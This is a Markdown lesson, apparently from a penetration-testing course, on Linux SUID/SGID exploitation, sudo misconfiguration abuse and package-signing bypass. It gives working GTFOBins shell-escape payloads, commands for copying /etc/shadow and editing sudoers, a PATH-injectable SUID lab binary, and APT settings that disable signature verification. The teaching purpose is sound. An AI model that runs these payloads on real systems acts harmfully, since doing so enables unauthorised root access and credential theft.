---
title: "SUID, Sudo, and Package Trust"
tags: [foundation, linux, SUID, SGID, sudo, GTFOBins, package-signing,
       privilege-escalation, attacker-mindset]
module: 01-Foundation-02
day: 12
related_topics:
  - Linux Filesystem and Users (Day 009)
  - Cron, Env Variables and Capabilities (Day 011)
  - Linux PrivEsc — full chain (Day 234)
---

# Day 012 — SUID, Sudo, and Package Trust

## Goals

By the end of this lesson you will be able to:

1. Explain the SUID and SGID permission bits at the kernel level — what
   happens to UIDs during a setuid exec.
2. Find all SUID/SGID binaries on a system and triage which are suspicious.
3. Exploit a custom SUID binary using the GTFOBins methodology.
4. Read and interpret `sudo -l` output and map every entry to an attack.
5. Exploit at least five distinct `sudo` misconfigurations using GTFOBins.
6. Explain how package signing (GPG, APT, RPM) works and what an attacker
   can do if it is bypassed or disabled.
7. Find and exploit an SGID binary to escalate group privileges.

---

## Prerequisites

- [Day 009 — Linux Filesystem, Permissions and Users](DAY-0009-Linux-Filesystem-Permissions-and-Users.md)
- [Day 011 — Cron, Env Variables and Capabilities](DAY-0011-Cron-Env-Variables-and-Capabilities.md)

---

## Main Content — Part 1: SUID and SGID Bits

### 1. Kernel-Level Mechanics of setuid exec

When a process executes a binary with the **setuid bit** set:

1. The kernel looks up the binary's **owner UID**.
2. The process's **effective UID** is set to that owner UID.
3. The **real UID** remains the caller's UID.
4. Capability sets are recalculated per `execve()` rules.

This means: if `/usr/bin/passwd` is owned by root and has the SUID bit,
any user who runs it gets root's effective UID for the duration of that
process. That is how passwd can write to `/etc/shadow` without being root.

**SGID** works identically but for groups: the effective GID becomes the
binary's group owner.

**Permission bit notation:**

```
-rwsr-xr-x   SUID set  (uppercase 'S' if execute bit is NOT set: -rwSr-xr-x)
-rwxr-sr-x   SGID set
-rwsr-sr-x   Both set
```

**Numeric notation:**

```
chmod 4755 /binary    # 4 = SUID, 7 = rwx owner, 5 = r-x group, 5 = r-x other
chmod 2755 /binary    # 2 = SGID
chmod 6755 /binary    # 6 = SUID + SGID
```

---

### 2. Finding SUID/SGID Binaries

```bash
# Find all SUID binaries (setuid bit = 4000)
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries (setgid bit = 2000)
find / -perm -2000 -type f 2>/dev/null

# Find both simultaneously
find / -perm /6000 -type f 2>/dev/null

# Focus outside standard paths (standard SUID binaries are expected)
find / -perm -4000 -type f 2>/dev/null | \
    grep -vE "^/(bin|sbin|usr/bin|usr/sbin|usr/lib|lib)"

# Show owner, permissions, and path together
find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \;
```

**Standard SUID binaries (expected — low risk):**

```
/usr/bin/passwd       — writes /etc/shadow
/usr/bin/sudo         — privilege escalation framework
/usr/bin/su           — switch user
/usr/bin/newgrp       — switch primary group
/usr/bin/chsh         — change login shell
/usr/bin/chfn         — change finger info
/usr/sbin/mount.nfs   — mount NFS
/bin/ping             — raw socket for ICMP
```

**Anything outside this list warrants investigation.**

---

### 3. GTFOBins — SUID Exploitation

[GTFOBins](https://gtfobins.github.io/) is the authoritative reference for
exploiting binaries that have been granted elevated privileges (SUID, sudo,
capabilities). Every entry has category-specific payloads.

**Do not just run GTFOBins payloads.** Understand why each one works.

**Case 1 — `find` with SUID:**

```bash
# find SUID → executes commands with elevated UID
/usr/bin/find . -exec /bin/sh -p \; -quit
# -exec runs a command: /bin/sh -p
# -p = privileged mode: don't drop EUID even if EUID != RUID
# -quit stops after one match
```

**Case 2 — `vim` with SUID:**

```bash
/usr/bin/vim -c ':!/bin/sh -p'
# vim's :! command runs a shell command
# Since vim is SUID root, the shell runs with root EUID
```

**Case 3 — `cp` with SUID:**

```bash
# cp SUID root → copy /etc/shadow to a readable location
/usr/bin/cp /etc/shadow /tmp/shadow_copy
chmod 644 /tmp/shadow_copy
cat /tmp/shadow_copy
# Crack the root hash offline with hashcat
```

**Case 4 — `python3` with SUID:**

```bash
/usr/bin/python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
```

**Case 5 — `bash` with SUID (extremely common finding):**

```bash
# If someone stupidly did: chmod +s /bin/bash
/bin/bash -p
# -p = privileged: keeps EUID from the setuid bit
# Gives interactive root shell
```

**Case 6 — `nano` or `less` with SUID (GTFOBins file write):**

```bash
# nano SUID → write arbitrary file as root
nano /etc/sudoers
# Append: alice ALL=(ALL) NOPASSWD: ALL
# Save, exit, then: sudo su

# less SUID → spawn shell from inside less
less /etc/passwd
# Then type: !/bin/sh -p
```

---

### 4. SGID Exploitation — Group Privilege Escalation

SGID grants the binary's **group** to the process. This matters when:

- A group has access to sensitive files (e.g. `shadow`, `disk`, `docker`).
- A SGID binary can be abused to run arbitrary commands as that group.

**Example — SGID `mail` group:**

```bash
# Some mail utilities are SGID mail and can read/write mail spool
find / -perm -2000 2>/dev/null | while read f; do
    group=$(stat -c '%G' "$f")
    echo "$f → group: $group"
done

# If a SGID binary is in the 'disk' group, and the disk group can
# read block devices, an attacker can read raw disk data:
# /dev/sda is readable by group 'disk'
# dd if=/dev/sda | strings | grep -i password
```

---

## Main Content — Part 2: Sudo

### 5. How sudo Works

`sudo` reads `/etc/sudoers` (or drop-ins in `/etc/sudoers.d/`) to determine
what commands a user or group may run as what other users.

**Reading sudoers safely:**

```bash
# Never edit /etc/sudoers with a regular editor — always use:
sudo visudo

# Check your own sudo privileges:
sudo -l
```

**Sudoers rule anatomy:**

```
# Format: WHO  WHERE=(AS_WHOM) [OPTIONS:] WHAT
alice   ALL=(ALL) ALL             # alice can run anything as anyone (full sudo)
alice   ALL=(ALL) NOPASSWD: ALL   # same, no password required
alice   ALL=(root) /usr/bin/find  # alice can run find as root only
%admin  ALL=(ALL) ALL             # group 'admin' can run anything
```

**Key keywords:**

| Token | Meaning |
|---|---|
| `ALL` (host) | From any host |
| `(ALL)` (runas) | As any user |
| `NOPASSWD:` | No password required |
| `PASSWD:` | Password required (default) |
| `!command` | Explicitly deny this command |
| `env_reset` | Clear environment before running |
| `env_keep` | Preserve specific env vars (dangerous) |

---

### 6. Exploiting sudo — Reading the Output

When you have access to a box, `sudo -l` is one of the first commands you run.

**Scenario 1 — NOPASSWD unrestricted:**

```bash
sudo -l
# (ALL) NOPASSWD: ALL
sudo /bin/bash
# Done. Root shell.
```

**Scenario 2 — Allowed to run a specific binary:**

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find

sudo find / -name "*.conf" -exec /bin/sh -p \;
```

**Scenario 3 — vim allowed:**

```bash
sudo vim /etc/hosts
# Inside vim:
:set shell=/bin/bash
:shell
# Root shell
# OR:
:!/bin/bash
```

**Scenario 4 — less or man allowed:**

```bash
sudo less /etc/passwd
# Type: !/bin/sh

sudo man man
# Type: !/bin/sh
```

**Scenario 5 — Script allowed but the script calls other programs:**

```bash
sudo -l
# (root) NOPASSWD: /opt/scripts/run_backup.sh

cat /opt/scripts/run_backup.sh
# #!/bin/bash
# tar -czf /backup/data.tar.gz /home/*

# The script calls 'tar' without absolute path:
# Create a malicious tar in a directory you control,
# and manipulate PATH if the script doesn't reset it.
# Or: check if the script is writable (covered Day 011).
```

**Scenario 6 — Allowed to run as a specific user (not root) who has access:**

```bash
sudo -l
# (webapp) NOPASSWD: /bin/bash

sudo -u webapp /bin/bash
# Now you are 'webapp'
# webapp might have access to database credentials, source code, etc.
```

---

### 7. Sudoers Bypass Techniques

**Technique 1 — Shell escape via editor flags:**

```bash
# sudo allowed for vi, vim, nano, emacs, ed, nano, etc.
sudo vim file
# :!bash
# or set shell in vim config

sudo nano file
# Ctrl+R Ctrl+X → execute command: bash
```

**Technique 2 — `env` or `env_keep` bypass:**

```bash
# If sudoers has: Defaults env_keep+=PYTHONSTARTUP
PYTHONSTARTUP=/tmp/evil.py sudo python3 /allowed/script.py
# /tmp/evil.py runs before the script: import os; os.system('/bin/bash')
```

**Technique 3 — Argument injection:**

```bash
# sudo allowed: /usr/bin/git log
# git's pager is less; less can spawn a shell
sudo git log
# When less opens, type: !/bin/sh
```

**Technique 4 — Wildcard in sudoers:**

```bash
# Sometimes misconfigured as:
# (root) NOPASSWD: /usr/bin/python3 /opt/scripts/*.py
# You can create /opt/scripts/evil.py if you own /opt/scripts
sudo python3 /opt/scripts/evil.py
```

---

## Main Content — Part 3: Package Trust

### 8. How APT Package Signing Works (Debian/Ubuntu)

Linux package managers use GPG signatures to verify package integrity.
The chain:

1. **Debian/Ubuntu**: Packages are signed with the distribution's GPG key.
2. `apt` downloads the package + a detached signature.
3. `apt` verifies the signature against `/etc/apt/trusted.gpg.d/`.
4. If valid → install. If invalid → `apt` refuses with an error.

**Key files:**

```
/etc/apt/sources.list          # Repository URLs
/etc/apt/sources.list.d/       # Drop-in repo configs
/etc/apt/trusted.gpg.d/        # Trusted GPG public keys
/etc/apt/apt.conf.d/           # APT configuration
```

**What an attacker can do:**

- **Add a malicious repo** to `/etc/apt/sources.list.d/` (requires write
  access — i.e. already have privesc or misconfigured permissions).
- **Disable signature checking** (requires root or write access to APT conf):

```bash
# In /etc/apt/apt.conf.d/99-no-verify (if writable):
APT::Get::AllowUnauthenticated "true";
Acquire::AllowInsecureRepositories "true";
```

- **MITM the APT transport** if the repo uses HTTP (not HTTPS).

**Why this matters for defenders:** Disabling package verification is a
post-exploitation persistence technique. Attackers add repos to maintain
a foothold that survives reboots and even re-installs of specific packages.

---

### 9. RPM Package Trust (Red Hat / CentOS / Fedora)

```bash
# Check GPG signature of an installed package
rpm -K package.rpm

# List installed GPG keys
rpm -q gpg-pubkey --qf '%{name}-%{version}-%{release} --> %{summary}\n'

# Import a new key (legit use: adding a vendor key)
rpm --import /path/to/key.gpg

# Verify all installed package files against RPM database
rpm -Va
# S = file size changed
# M = mode (permissions) changed
# 5 = MD5 checksum changed
# This is a forensic tool — changed checksums = tampering
```

---

## Key Takeaways

1. **SUID bit = that binary runs with the file owner's UID.** Every custom
   SUID binary is a potential privesc. Only standard system SUID binaries
   should exist. Anything custom needs justification.
2. **GTFOBins is a reference, not a recipe book.** Know *why* each exploit
   works: file writes, shell escapes, argument injection, env var abuse.
   If you understand the mechanism, you can adapt when the exact payload
   doesn't work.
3. **`sudo -l` is always step one.** NOPASSWD + any powerful command = instant
   root. Even restricted commands are often exploitable via shell escapes,
   pager abuse, or argument injection.
4. **SGID on disk, docker, or shadow groups is root-equivalent.** Group
   privilege is under-appreciated. `docker` group = root. `disk` group =
   read any file on the block device.
5. **Package signing is the last line of software supply chain trust.**
   An attacker who can add a repo and disable verification has persistence
   that survives most incident response procedures.

---

## Exercises

### Exercise 1 — SUID Binary Enumeration

On your lab machine:

1. Run `find / -perm -4000 -type f 2>/dev/null | sort`. List every SUID
   binary you find.
2. Separate the list into: (a) expected system binaries, (b) unexpected.
3. For any unexpected entries, look them up on GTFOBins.

---

### Exercise 2 — Create and Exploit a Vulnerable SUID Binary

```bash
# As root, create a deliberately vulnerable SUID binary:
cat > /opt/vuln_backup.c << 'EOF'
#include <stdlib.h>
int main() {
    system("id");           // Calls 'id' without absolute path
    system("cp /etc/shadow /tmp/shadow_copy");
    return 0;
}
EOF
gcc -o /opt/vuln_backup /opt/vuln_backup.c
chown root:root /opt/vuln_backup
chmod 4755 /opt/vuln_backup
```

As a regular user:

1. Run `/opt/vuln_backup` and observe the output.
2. Exploit the PATH injection to get the `id` call to run something of your
   choice (hint: create a fake `id` script and manipulate PATH).
3. Can you use the shadow copy to crack root's password?
4. Fix the binary by using absolute paths for all `system()` calls.

---

### Exercise 3 — sudo Exploitation

In your lab sudoers (edit safely with `sudo visudo`):

```
alice ALL=(root) NOPASSWD: /usr/bin/vim
```

As alice:

1. Use `sudo vim` to get a root shell (there are at least three ways — find
   all three).
2. Use `sudo vim` to append an entry to `/etc/sudoers` that gives alice full
   unrestricted sudo.
3. Explain to yourself: what is the root cause? What should the admin have
   done instead?

---

### Exercise 4 — SGID Abuse

```bash
# As root: grant find the SGID bit with the 'shadow' group
chown root:shadow /usr/bin/find
chmod g+s /usr/bin/find
```

As a regular user:

1. Find this SGID binary with `find / -perm -2000 2>/dev/null`.
2. Determine what the `shadow` group gives access to.
3. Use the SGID `find` to read `/etc/shadow`.
4. Clean up: `chown root:root /usr/bin/find; chmod g-s /usr/bin/find`.

---

## Questions

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Previous: [Day 011 — Cron, Env Variables and Capabilities](DAY-0011-Cron-Env-Variables-and-Capabilities.md)*
*Next: [Day 013 — Logs, Named Pipes and Sockets](DAY-0013-Logs-Named-Pipes-and-Sockets.md)*
